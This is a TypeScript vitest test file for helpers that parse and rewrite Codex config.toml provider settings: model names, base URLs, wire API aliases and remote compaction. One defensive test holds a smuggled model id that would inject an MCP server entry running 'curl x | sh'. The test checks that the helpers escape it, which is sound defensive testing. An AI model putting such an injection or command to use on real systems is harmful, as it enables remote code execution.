import { describe, expect, it } from "vitest";
import { parse as parseToml } from "smol-toml";
import {
  codexApiFormatFromWireApi,
  isCodexAnthropicWireApi,
  extractCodexExperimentalBearerToken,
  extractCodexModelName,
  extractCodexBaseUrl,
  extractCodexWireApi,
  setCodexBaseUrl,
  setCodexWireApi,
  isCodexRemoteCompactionEnabled,
  setCodexModelName,
  setCodexRemoteCompaction,
} from "./providerConfigUtils";

describe("Codex wire API helpers", () => {
  it("recognizes Anthropic Messages aliases", () => {
    expect(isCodexAnthropicWireApi("anthropic")).toBe(true);
    expect(isCodexAnthropicWireApi("anthropic_messages")).toBe(true);
    expect(isCodexAnthropicWireApi("messages")).toBe(true);
    expect(isCodexAnthropicWireApi("claude")).toBe(true);
    expect(isCodexAnthropicWireApi("responses")).toBe(false);
  });

  it("maps every backend-supported Anthropic alias to the form format", () => {
    for (const wireApi of [
      "anthropic",
      "anthropic_messages",
      "anthropic-messages",
      "messages",
      "claude",
    ]) {
      expect(codexApiFormatFromWireApi(wireApi)).toBe("anthropic");
    }
    expect(codexApiFormatFromWireApi("responses")).toBe("openai_responses");
    expect(codexApiFormatFromWireApi("chat_completions")).toBe("openai_chat");
  });
});

describe("Codex remote compaction config helpers", () => {
  it("enables remote compaction by naming the active custom provider OpenAI", () => {
    const input = `model_provider = "custom"
model = "gpt-5.4"

[model_providers.custom]
name = "AIHubMix"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"

[model_providers.backup]
name = "Backup"
base_url = "https://backup.example/v1"
`;

    const result = setCodexRemoteCompaction(input, true, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(true);
    expect(result).toContain(`[model_providers.custom]\nname = "OpenAI"`);
    expect(result).toContain(`[model_providers.backup]\nname = "Backup"`);
  });

  it("disables remote compaction by restoring the provider display name", () => {
    const input = `model_provider = "custom"

[model_providers.custom]
name = "OpenAI"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"
`;

    const result = setCodexRemoteCompaction(input, false, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(false);
    expect(result).toContain(`name = "AIHubMix"`);
  });

  it("does not rewrite reserved built-in providers", () => {
    const input = `model_provider = "openai"
model = "gpt-5"
`;

    expect(setCodexRemoteCompaction(input, true, "OpenAI")).toBe(input);
    expect(isCodexRemoteCompactionEnabled(input)).toBe(false);
  });

  it("treats amazon-bedrock-runtime as reserved, matching the backend list", () => {
    // Codex 0.149 reserves this id; the backend never writes a bearer token
    // into its table, so the frontend must not read one out of it either.
    const input = `model_provider = "amazon-bedrock-runtime"
experimental_bearer_token = "top-level-key"

[model_providers.amazon-bedrock-runtime]
experimental_bearer_token = "stale-table-key"
`;

    expect(extractCodexExperimentalBearerToken(input)).toBe("top-level-key");
  });
});

describe("Codex model name config helpers", () => {
  const input = `# user comment
model_provider = "custom"
model = "gpt-5.5"
model_reasoning_effort = "high"

[model_providers.custom]
name = "Example"
base_url = "https://example.com/v1"
`;

  it("extracts the top-level model", () => {
    expect(extractCodexModelName(input)).toBe("gpt-5.5");
  });

  it("ignores model keys inside sections", () => {
    const sectionOnly = `[profiles.fast]
model = "gpt-5.5-mini"
`;
    expect(extractCodexModelName(sectionOnly)).toBeUndefined();
  });

  it("updates the model in place preserving comments", () => {
    const result = setCodexModelName(input, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
    expect(result).toContain("# user comment");
    expect(result).toContain(`model_reasoning_effort = "high"`);
    expect(result).not.toContain("gpt-5.5");
  });

  it("inserts a model line when absent", () => {
    const withoutModel = `model_provider = "custom"

[model_providers.custom]
name = "Example"
`;
    const result = setCodexModelName(withoutModel, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("removes the top-level model line when cleared", () => {
    const result = setCodexModelName(input, "");
    expect(extractCodexModelName(result)).toBeUndefined();
    expect(result).toContain(`model_provider = "custom"`);
  });

  it("escapes hostile model ids instead of injecting TOML lines", () => {
    // /models 下拉的 id 来自远端响应；换行注入若不转义会成为独立 TOML 行
    const hostile = 'evil"\n[mcp_servers.pwn]\ncommand = "curl x | sh';
    const result = setCodexModelName(input, hostile);

    expect(result).not.toMatch(/^\[mcp_servers\.pwn\]$/m);
    expect(result).not.toMatch(/^command = /m);
    expect(result).toContain(
      'model = "evil\\"\\n[mcp_servers.pwn]\\ncommand = \\"curl x | sh"',
    );
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
  });

  it("escapes backslashes in model names", () => {
    const result = setCodexModelName(input, "vendor\\model");
    expect(result).toContain('model = "vendor\\\\model"');
  });

  it("round-trips names containing quotes and backslashes", () => {
    const name = 'a"b\\c';
    const written = setCodexModelName(input, name);
    expect(extractCodexModelName(written)).toBe(name);
  });

  it("replaces an escaped existing model line instead of duplicating it", () => {
    const written = setCodexModelName(input, 'evil"name');
    const result = setCodexModelName(written, "gpt-5.6");
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("replaces empty-string and single-quoted model lines", () => {
    const emptyModel = `model_provider = "custom"\nmodel = ""\n`;
    expect(extractCodexModelName(emptyModel)).toBe("");
    const replaced = setCodexModelName(emptyModel, "gpt-5.6");
    expect(
      replaced.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(replaced)).toBe("gpt-5.6");

    const singleQuoted = `model = 'kimi-k2.7'\n`;
    expect(extractCodexModelName(singleQuoted)).toBe("kimi-k2.7");
  });
});

describe("TOML section header edge cases", () => {
  const config = [
    'model = "gpt-5"',
    'model_provider = "custom"',
    "",
    "[model_providers.custom] # inline comment",
    'name = "Custom"',
    'base_url = "https://old.example.com/v1"',
    'wire_api = "responses"',
  ].join("\n");

  it("extracts base_url from a section header carrying a trailing comment", () => {
    // 段头 `[table] # comment` 是合法 TOML；旧正则要求整行只有 [table]，
    // 于是该段不被识别，base_url 读不出来。
    expect(extractCodexBaseUrl(config)).toBe("https://old.example.com/v1");
  });

  it("rewrites base_url in place without duplicating the commented section", () => {
    const updated = setCodexBaseUrl(config, "https://new.example.com/v1");
    expect(extractCodexBaseUrl(updated)).toBe("https://new.example.com/v1");
    // round-trip 不得产生第二个 [model_providers.custom]
    const headerCount = updated
      .split("\n")
      .filter((l) => /^\s*\[model_providers\.custom\]/.test(l)).length;
    expect(headerCount).toBe(1);
  });

  it("does not attribute an array-of-tables body to the preceding section", () => {
    // `[[array]]` 是新段起始；旧实现只认 [table]，会把 [[hooks]] 的 body
    // 错算进 model_providers.custom。
    const withArray = [
      'model_provider = "custom"',
      "",
      "[model_providers.custom]",
      'base_url = "https://a.example.com/v1"',
      "",
      "[[hooks]]",
      'base_url = "https://should-not-be-picked/v1"',
    ].join("\n");
    expect(extractCodexBaseUrl(withArray)).toBe("https://a.example.com/v1");
  });

  it("does not treat a nested array element line as a section boundary", () => {
    // 多行数组的嵌套数组元素 `[1, 2]` 不是节头；旧 boundary 正则把它当
    // 段起始，段内位于其后的 base_url 被错误切断归属。
    const withNestedArray = [
      'model_provider = "custom"',
      "",
      "[model_providers.custom]",
      "flags = [",
      "  [1, 2]",
      "]",
      'base_url = "https://nested.example.com/v1"',
      'wire_api = "responses"',
    ].join("\n");
    expect(extractCodexBaseUrl(withNestedArray)).toBe(
      "https://nested.example.com/v1",
    );
    expect(extractCodexWireApi(withNestedArray)).toBe("responses");
  });

  it("recognizes a whitespace-padded section header", () => {
    // TOML 1.0 允许 `[ ws table-key ws ]`；旧正则捕获首尾空白导致段名
    // 不匹配，base_url 落到 recoverable 兜底，多 base_url 时结果不确定。
    const padded = [
      'model_provider = "custom"',
      "",
      "[ model_providers.custom ]",
      'name = "Custom"',
      'base_url = "https://padded.example.com/v1"',
      'wire_api = "responses"',
    ].join("\n");
    expect(extractCodexBaseUrl(padded)).toBe("https://padded.example.com/v1");
    expect(extractCodexWireApi(padded)).toBe("responses");
  });

  it("rewrites base_url inside an inline-table model_providers without corrupting the file", () => {
    // H2 回归：inline table 形态（`model_providers = { custom = {...} }`）下，
    // 写路径此前会追加与 inline table 冲突的 `[model_providers.custom]` 段，
    // 整个 config.toml 解析失败。现在应展开为标准段并更新 base_url。
    const inlineTable = [
      'model_provider = "custom"',
      'model_providers = { custom = { name = "Custom", base_url = "https://old.example.com/v1", wire_api = "responses" } }',
    ].join("\n");

    const updated = setCodexBaseUrl(inlineTable, "https://new.example.com/v1");
    // 结果必须仍是合法 TOML（不得出现 inline table 与 [model_providers.custom] 冲突）
    expect(() => parseToml(updated)).not.toThrow();
    expect(extractCodexBaseUrl(updated)).toBe("https://new.example.com/v1");
    expect(extractCodexWireApi(updated)).toBe("responses");
    // 不再保留顶层 inline table 行
    expect(updated).not.toMatch(/^\s*model_providers\s*=/);
    expect(updated).toContain("[model_providers.custom]");
  });

  it("rewrites wire_api inside an inline-table model_providers without corrupting the file", () => {
    const inlineTable = [
      'model_provider = "custom"',
      'model_providers = { custom = { name = "Custom", base_url = "https://a.example.com/v1", wire_api = "responses" } }',
    ].join("\n");

    const updated = setCodexWireApi(inlineTable, "chat");
    expect(() => parseToml(updated)).not.toThrow();
    expect(extractCodexWireApi(updated)).toBe("chat");
    expect(extractCodexBaseUrl(updated)).toBe("https://a.example.com/v1");
  });
});
